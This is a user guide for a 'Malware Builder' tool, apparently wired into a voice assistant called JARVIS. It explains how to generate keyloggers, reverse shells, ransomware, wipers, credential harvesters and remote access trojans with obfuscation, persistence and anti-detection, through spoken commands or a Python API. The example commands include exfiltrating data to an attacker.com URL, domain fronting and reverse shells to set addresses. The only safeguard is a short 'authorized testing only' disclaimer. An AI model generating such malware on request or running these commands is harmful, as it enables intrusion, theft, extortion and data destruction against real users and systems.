# Malware Builder Guide

## Overview

The Malware Builder allows you to create custom malware payloads on-the-fly using voice commands or programmatic API. It supports templates, components, and real-time customization.

## Quick Start

### Voice Commands

Simply speak your requirements:

```
"Create a keylogger with obfuscation"
"Build a reverse shell to 192.168.1.100 on port 4444"
"Make a file encryptor with persistence"
"Generate a stealth keylogger"
"Create an obfuscated reverse shell with encryption"
```

## Features

### Base Types

1. **Keylogger** - Captures keystrokes
2. **Reverse Shell** - Remote command execution
3. **File Encryptor** - Encrypts files
4. **Network Scanner** - Scans network ports
5. **Data Exfiltrator** - Exfiltrates data
6. **Credential Harvester** - Harvests credentials
7. **RAT** - Remote Access Trojan
8. **Cryptominer** - Cryptocurrency miner
9. **Wiper** - Deletes files
10. **Browser Hijacker** - Modifies browser settings

### Components

- **Obfuscation** - Code obfuscation
- **Encryption** - Code encryption
- **Stealth** - Anti-detection
- **Persistence** - Auto-start mechanisms
- **Polymorphic** - Code mutation

### Advanced Payloads

1. **Memory-Only/Fileless** - Runs entirely in memory
2. **Multi-Stage** - Downloads and executes stages
3. **Self-Destruct** - Automatically deletes itself
4. **Encrypted Communication** - Encrypted C2 communication
5. **Domain Fronting** - Bypasses network filters
6. **Living Off The Land (LOLBAS)** - Uses legitimate tools
7. **Ransomware** - Encrypts files for ransom
8. **Backdoor** - Persistent remote access

## Usage Examples

### Basic Creation

```python
from cybersecurity.malware_builder import MalwareBuilder

builder = MalwareBuilder()

# Create simple keylogger
result = builder.build_custom('keylogger')
print(f"Created: {result['file']}")

# Create with features
result = builder.build_custom(
    'keylogger',
    features=['obfuscation', 'persistence']
)
```

### Voice Command Parsing

```python
# Parse voice command
result = builder.build_from_voice(
    "Create an obfuscated keylogger with persistence"
)
```

### Advanced Payloads

```python
from cybersecurity.advanced_payloads import AdvancedPayloads

payloads = AdvancedPayloads()

# Memory-only payload
result = payloads.create_memory_only_payload("print('Hello')")

# Multi-stage payload
result = payloads.create_multi_stage_payload([
    "http://example.com/stage1.py",
    "http://example.com/stage2.py"
])

# Encrypted communication
result = payloads.create_encrypted_communication_payload(
    "192.168.1.100", 4444
)
```

## Voice Command Examples

### Simple Commands
```
"Create a keylogger"
"Build a reverse shell"
"Make a file encryptor"
```

### With Features
```
"Create an obfuscated keylogger"
"Build a reverse shell with encryption"
"Make a stealth file encryptor"
"Generate a polymorphic keylogger"
```

### With Parameters
```
"Create a reverse shell to 192.168.1.100 on port 4444"
"Build a network scanner for 192.168.1.0/24"
"Make a data exfiltrator to http://attacker.com/exfil"
```

### Advanced Payloads
```
"Create a memory-only payload"
"Build a multistage payload with http://example.com/stage1.py"
"Make a self-destruct payload"
"Generate an encrypted communication payload to 192.168.1.100 port 4444"
"Create a domain fronting payload with front domain example.com and real domain attacker.com"
"Build a LOLBAS payload with command whoami"
"Make a ransomware payload for directory C:\\test"
"Create a backdoor on port 4444"
```

## Integration

The malware builder is automatically integrated into JARVIS voice commands. Just speak naturally:

```
"Jarvis, create an obfuscated keylogger"
"Jarvis, build a reverse shell to 192.168.1.100"
"Jarvis, make a stealth file encryptor with persistence"
```

## Customization

### Adding Templates

Add new templates to `_load_templates()`:

```python
def _get_my_template(self) -> str:
    return '''
# Your template code here
{parameter1}
{parameter2}
'''
```

### Adding Components

Add new components to `_load_components()`:

```python
def _get_my_components(self) -> Dict:
    return {
        'my_component': '''
# Component code
'''
    }
```

## Parameters

Common parameters extracted from voice commands:

- **IP Address**: Automatically detected from command
- **Port**: Extracted from "port X" or "on port X"
- **Directory**: Extracted from "directory X" or "dir X"
- **URL**: Extracted from HTTP/HTTPS URLs
- **Command**: Extracted for LOLBAS payloads

## Best Practices

1. **Always test in isolated VMs**
2. **Use for authorized testing only**
3. **Review generated code before use**
4. **Understand what each payload does**
5. **Follow legal and ethical guidelines**

## Troubleshooting

### "Could not determine malware type"
- Be more specific: "keylogger", "reverse shell", etc.
- Use aliases: "kl" for keylogger, "rs" for reverse shell

### "Parameter not found"
- Specify parameters clearly: "to 192.168.1.100", "on port 4444"
- Use natural language: "Create reverse shell to IP 192.168.1.100"

### "Feature not recognized"
- Use standard feature names: obfuscation, encryption, stealth, persistence
- Combine features: "with obfuscation and encryption"

## Security Notes

⚠️ **WARNING**: All payloads are for educational and authorized testing purposes only.

- Never use on production systems
- Always test in isolated VMs
- Get proper authorization before testing
- Follow responsible disclosure practices
- Review generated code carefully

---

**Enjoy building custom payloads on-the-fly!**
